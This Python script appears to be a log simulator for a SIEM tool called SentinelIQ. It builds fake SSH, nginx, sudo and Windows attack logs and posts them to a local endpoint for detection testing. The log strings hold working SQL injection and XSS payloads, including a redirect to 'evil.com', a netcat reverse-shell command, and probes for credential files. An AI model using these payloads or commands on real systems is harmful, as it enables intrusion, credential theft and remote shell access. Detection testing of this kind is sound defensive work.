#!/usr/bin/env python3
"""
SentinelIQ — Log Simulator
============================
Generates realistic fake attack logs (auth.log, nginx, Windows Events)
and POSTs them to SentinelIQ's /api/logs/ingest endpoint.

Use this to test the SIEM log ingestion pipeline without real servers.

Attack scenarios:
  1. SSH Brute Force          → HIGH   (T1110)
  2. Root Login Attempts      → CRITICAL (T1078)
  3. Nginx SQL Injection      → CRITICAL (T1190)
  4. Nginx Web Scanner (4xx)  → MEDIUM (T1595)
  5. Nginx DoS (5xx spike)    → HIGH   (T1499)
  6. Sudo Privilege Escalation→ HIGH   (T1548)
  7. Windows Failed Logon     → HIGH   (T1110)
  8. Nginx XSS Attempts       → CRITICAL (T1190)
  9. ALL scenarios
"""

import requests
import random
import json
import time
import sys
from datetime import datetime

API = "http://localhost:8000"
INGEST  = f"{API}/api/logs/ingest"
BULK    = f"{API}/api/logs/ingest/bulk"

ATTACKER_IPS = [
    "23.95.114.30", "185.220.101.45", "159.203.67.89",
    "94.102.49.190", "45.33.32.156", "198.54.117.200",
    "141.98.10.33",  "180.76.5.194",  "222.186.15.70",
    "91.240.118.172","5.188.206.197", "193.32.126.61",
]

BANNER = """
╔══════════════════════════════════════════════════════════╗
║   SentinelIQ — Log Simulator                            ║
║   Generates realistic attack logs for SIEM testing      ║
║                                                          ║
║   Auth · Nginx · Windows Events · Syslog                ║
╚══════════════════════════════════════════════════════════╝
"""


def _ts():
    return datetime.now().strftime("%b %d %H:%M:%S").replace(" 0", "  ")

def _nginx_ts():
    return datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")

def _send_bulk(logs: list[dict]) -> bool:
    try:
        r = requests.post(BULK, json={"logs": logs}, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print(f"  ❌ {e}")
        return False


# ── 1. SSH Brute Force ────────────────────────────────────────────────────────
def sim_ssh_brute(ip=None, count=25):
    ip = ip or random.choice(ATTACKER_IPS)
    users = ["root", "admin", "ubuntu", "oracle", "postgres", "user", "deploy", "git"]
    print(f"[SSH Brute] {count} failed logins from {ip} ...")
    logs = []
    for _ in range(count):
        user = random.choice(users)
        port = random.randint(50000, 65000)
        pid  = random.randint(1000, 9999)
        logs.append({"source": "linux-auth",
                     "raw": f"{_ts()} server sshd[{pid}]: Failed password for {user} from {ip} port {port} ssh2"})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} SSH failures from {ip}")


# ── 2. Root Login Attempts ────────────────────────────────────────────────────
def sim_root_login(ip=None, count=8):
    ip = ip or random.choice(ATTACKER_IPS)
    print(f"[Root Login] {count} root attempts from {ip} ...")
    logs = []
    for _ in range(count):
        port = random.randint(50000, 65000)
        pid  = random.randint(1000, 9999)
        logs.append({"source": "linux-auth",
                     "raw": f"{_ts()} server sshd[{pid}]: Failed password for root from {ip} port {port} ssh2"})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} root login attempts")


# ── 3. Nginx SQL Injection ────────────────────────────────────────────────────
def sim_nginx_sqli(ip=None, count=15):
    ip = ip or random.choice(ATTACKER_IPS)
    payloads = [
        "/login?user=admin'+OR+1=1--&pass=x",
        "/search?q=1+UNION+SELECT+username,password+FROM+users--",
        "/product?id=1;+DROP+TABLE+users--",
        "/api/users?id='+OR+'1'='1",
        "/page?cat=1+AND+SLEEP(5)--",
        "/admin/login?user=admin'--",
        "/report?from=0+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--",
    ]
    print(f"[Nginx SQLi] {count} SQL injection payloads from {ip} ...")
    logs = []
    for _ in range(count):
        path = random.choice(payloads)
        code = random.choice([200, 403, 500])
        size = random.randint(100, 2000)
        logs.append({"source": "nginx",
                     "raw": f'{ip} - - [{_nginx_ts()}] "GET {path} HTTP/1.1" {code} {size}'})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} SQLi attempts")


# ── 4. Nginx Web Scanner (4xx flood) ─────────────────────────────────────────
def sim_nginx_scan(ip=None, count=35):
    ip = ip or random.choice(ATTACKER_IPS)
    paths = [
        "/admin", "/.env", "/wp-admin/", "/phpmyadmin", "/.git/config",
        "/backup.zip", "/config.php", "/api/v1/admin", "/console",
        "/manager/html", "/.htpasswd", "/etc/passwd", "/xmlrpc.php",
        "/wp-login.php", "/.DS_Store", "/server-status", "/actuator/env",
        "/api/swagger-ui.html", "/api/docs",
    ]
    print(f"[Nginx Scan] {count} scanner requests (4xx) from {ip} ...")
    logs = []
    for _ in range(count):
        path   = random.choice(paths)
        status = random.choice([401, 403, 404])
        size   = random.randint(50, 500)
        logs.append({"source": "nginx",
                     "raw": f'{ip} - - [{_nginx_ts()}] "GET {path} HTTP/1.1" {status} {size}'})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} scanner requests")


# ── 5. Nginx DoS (5xx spike) ─────────────────────────────────────────────────
def sim_nginx_dos(ip=None, count=25):
    ip = ip or random.choice(ATTACKER_IPS)
    print(f"[Nginx DoS]  {count} requests causing 5xx from {ip} ...")
    logs = []
    for _ in range(count):
        path   = f"/api/data?q={'x' * random.randint(80, 300)}"
        status = random.choice([500, 502, 503, 504])
        size   = random.randint(200, 1000)
        logs.append({"source": "nginx",
                     "raw": f'{ip} - - [{_nginx_ts()}] "POST {path[:100]} HTTP/1.1" {status} {size}'})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} 5xx errors")


# ── 6. Sudo Privilege Escalation ─────────────────────────────────────────────
def sim_sudo_escalation(count=4):
    users = ["www-data", "jenkins", "apache", "tomcat", "node"]
    cmds  = [
        "/bin/bash", "/bin/sh",
        "chmod 777 /etc/passwd",
        "passwd root",
        "nc -e /bin/bash 10.0.0.1 4444",
        "python3 -c 'import os; os.system(\"bash\")'",
    ]
    print(f"[Sudo Priv-Esc] {count} suspicious sudo events ...")
    logs = []
    for _ in range(count):
        user = random.choice(users)
        cmd  = random.choice(cmds)
        logs.append({"source": "linux-auth",
                     "raw": f"{_ts()} server sudo:    {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND={cmd}"})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} sudo escalation events")


# ── 7. Windows Failed Logon (Event 4625) ─────────────────────────────────────
def sim_windows_failed_login(ip=None, count=20):
    ip = ip or random.choice(ATTACKER_IPS)
    users = ["Administrator", "admin", "user1", "guest", "svc-account", "backup"]
    print(f"[Win Events] {count} failed logons (Event 4625) from {ip} ...")
    logs = []
    for _ in range(count):
        event = {
            "EventID": 4625,
            "TimeCreated": datetime.now().isoformat(),
            "TargetUserName": random.choice(users),
            "IpAddress": ip,
            "LogonType": 3,
            "SubStatus": "0xC000006A",
        }
        logs.append({"source": "windows", "raw": json.dumps(event)})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} Windows logon failures")


# ── 8. Nginx XSS Attempts ────────────────────────────────────────────────────
def sim_nginx_xss(ip=None, count=12):
    ip = "141.98.10.33"
    payloads = [
        "/search?q=<script>alert('xss')</script>",
        "/comment?text=<img+src=x+onerror=alert(1)>",
        "/profile?name=<script>document.location='http://evil.com'</script>",
        "/page?title=<svg+onload=alert(document.cookie)>",
        "/api?callback=javascript:alert(1)",
    ]
    print(f"[Nginx XSS]  {count} XSS attempts from {ip} ...")
    logs = []
    for _ in range(count):
        path = random.choice(payloads)
        size = random.randint(200, 3000)
        logs.append({"source": "nginx",
                     "raw": f'{ip} - - [{_nginx_ts()}] "GET {path} HTTP/1.1" 200 {size}'})
    ok = _send_bulk(logs)
    print(f"  {'✅' if ok else '❌'} {count} XSS attempts")


# ── Menu ──────────────────────────────────────────────────────────────────────
SCENARIOS = {
    "1": ("SSH Brute Force",           lambda: sim_ssh_brute()),
    "2": ("Root Login Attempts",       lambda: sim_root_login()),
    "3": ("Nginx SQL Injection",       lambda: sim_nginx_sqli()),
    "4": ("Nginx Web Scanner (4xx)",   lambda: sim_nginx_scan()),
    "5": ("Nginx DoS (5xx spike)",     lambda: sim_nginx_dos()),
    "6": ("Sudo Privilege Escalation", lambda: sim_sudo_escalation()),
    "7": ("Windows Failed Logon",      lambda: sim_windows_failed_login()),
    "8": ("Nginx XSS Attempts",        lambda: sim_nginx_xss()),
    "9": ("ALL scenarios",             None),
}

if __name__ == "__main__":
    print(BANNER)

    # Connectivity check
    try:
        r = requests.get(f"{API}/api/diagnostic", timeout=3)
        print(f"✅ Connected to SentinelIQ at {API}\n")
    except Exception:
        print(f"❌ Cannot reach {API} — is uvicorn running?")
        sys.exit(1)

    print("Log attack scenarios:")
    for k, (name, _) in SCENARIOS.items():
        print(f"  {k}.  {name}")

    choice = input("\nSelect scenario [9 = ALL]: ").strip() or "9"
    if choice not in SCENARIOS:
        print("Invalid — running ALL.")
        choice = "9"

    name, fn = SCENARIOS[choice]
    confirm = input(f"\n⚠️  Start '{name}' simulation? (yes/no): ").strip().lower()
    if confirm not in ("yes", "y"):
        print("Aborted.")
        sys.exit(0)

    print(f"\n🚀 Starting...\n{'='*60}")

    if choice == "9":
        ip = random.choice(ATTACKER_IPS)
        sim_ssh_brute(ip, count=25)
        sim_root_login(ip, count=8)
        sim_nginx_sqli(count=15)
        sim_nginx_scan(count=35)
        sim_nginx_dos(count=25)
        sim_sudo_escalation(count=4)
        sim_windows_failed_login(count=20)
        sim_nginx_xss(count=12)
    else:
        fn()

    print(f"\n{'='*60}")
    print("✅ Log simulation complete!")
    print("📊 Dashboard → http://localhost:3000  (new alerts should appear!)")
